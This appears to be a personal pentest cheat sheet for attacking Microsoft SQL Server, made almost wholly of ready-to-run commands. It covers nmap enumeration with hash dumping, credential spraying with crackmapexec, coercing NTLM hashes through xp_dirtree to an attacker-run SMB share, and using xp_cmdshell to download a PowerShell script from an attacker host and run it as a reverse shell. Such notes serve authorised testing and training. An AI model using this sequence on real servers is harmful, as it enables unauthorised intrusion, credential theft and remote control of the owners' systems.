+++
title = "Pentest - MSSQL - Microsoft SQL Server p 1433"
author = ["svejk"]
tags = ["sql", "pentest"]
draft = false
+++

## Pentest Microsoft SQL Server {#pentest-microsoft-sql-server}


### Enumeration {#enumeration}

```shell { linenos=true, linenostart=1 }
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```


### Test credentials {#test-credentials}

```shell { linenos=true, linenostart=1 }
crackmapexec mssql <host> -u users.txt -p passwords.txt
```


### Establish connection {#establish-connection}

```shell
impacket-mssqlclient -dc-ip <ip> -windows-auth domain/username:password@host
```


#### List DBs {#list-dbs}

```sql { linenos=true, linenostart=1 }
SELECT name FROM master..sysdatabases;
```


#### Check permissions {#check-permissions}

```sql { linenos=true, linenostart=1 }
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```


#### `xp_dirtree` {#xp-dirtree}

```sql { linenos=true, linenostart=1 }
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

Use `xp_dirtree` to obtain NTLM hashes

```shell { linenos=true, linenostart=1 }
#victim
xp_dirtree \\<attacker_ip>\file.txt
#attacker
sudo impacket-smbserver -smb2support share $(pwd)
```


### `xp_cmdshell` {#xp-cmdshell}

Enable - run command - rev shell

```shell { linenos=true, linenostart=1 }
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell powershell -c iwr http://<ip>/shell.ps1 -o C:\programdata\rev.ps1
xp_cmdshell powershell -c C:\programdata\rev.ps1
```

[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
